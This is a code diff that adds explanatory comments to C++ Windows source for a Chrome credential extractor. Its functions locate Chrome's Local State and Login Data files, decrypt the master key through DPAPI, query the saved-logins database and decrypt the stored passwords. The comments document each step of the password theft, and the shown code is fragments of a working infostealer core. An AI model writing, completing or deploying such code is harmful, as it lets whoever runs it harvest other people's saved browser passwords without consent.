@@ -4,6 +4,10 @@
 //Check if WIndows system
 #ifdef _WIN32
 
+// Finds the path to the Local State file.
+// This function retrieves the user's profile path and constructs the path to
+// the Local State file used by Google Chrome.
+// @return The path to the Local State file as a wide string.
 std::wstring FindLocalState() {
   WCHAR userProfile[MAX_PATH];
   HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
@@ -19,6 +23,10 @@ std::wstring FindLocalState() {
   return std::wstring(localStatePath);
 }
 
+// Finds the path to the Login Data file.
+// This function retrieves the user's profile path and constructs the path to
+// the Login Data file used by Google Chrome.
+// @return The path to the Login Data file as a wide string.
 std::wstring FindLoginData() {
   WCHAR userProfile[MAX_PATH];
   HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
@@ -34,6 +42,11 @@ std::wstring FindLoginData() {
   return std::wstring(loginDataPath);
 }
 
+// Retrieves the encrypted key from the Local State file.
+// This function reads the Local State file in JSON format and extracts the
+// encrypted key used by Google Chrome.
+// @param localStatePath The path to the Local State file.
+// @return The encrypted key as a string.
 std::string getEncryptedKey(const std::wstring& localStatePath) {
   std::ifstream file(localStatePath);
   if (!file.is_open()) {
@@ -63,6 +76,11 @@ std::string getEncryptedKey(const std::wstring& localStatePath) {
   return encryptedKey;
 }
 
+// Decrypts an encrypted key using the CryptUnprotectData function.
+// This function decodes a Base64-encoded string and decrypts it to retrieve
+// the original key.
+// @param encrypted_key The encrypted key as a Base64-encoded string.
+// @return The decrypted key as a DATA_BLOB structure.
 DATA_BLOB decryptKey(const std::string encrypted_key) {
   if (encrypted_key.empty()) {
     warn("Input string is empty.");
@@ -108,6 +126,12 @@ DATA_BLOB decryptKey(const std::string encrypted_key) {
   return DataOutput;
 }
 
+// Parses the Login Data file to extract and decrypt login credentials.
+// This function opens the Login Data SQLite database, executes a query to retrieve login
+// credentials, and decrypts the passwords using the provided decryption key.
+// @param loginDataPath The path to the Login Data file.
+// @param decryptionKey The key used to decrypt the login data.
+// @return An integer indicating success (0) or failure (non-zero).
 int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) {
   sqlite3* loginDataBase = nullptr;
   int openingStatus = 0;
@@ -217,6 +241,13 @@ int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) 
   }
 }
 
+// Decrypts a password using the provided key and initialization vector (IV).
+// This function uses the libsodium library to decrypt the ciphertext.
+// @param ciphertext The encrypted password.
+// @param ciphertext_len The length of the encrypted password.
+// @param key The key used for decryption.
+// @param iv The initialization vector used for decryption.
+// @param decrypted The buffer to store the decrypted password.
 void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
   unsigned long long decrypted_len;
 
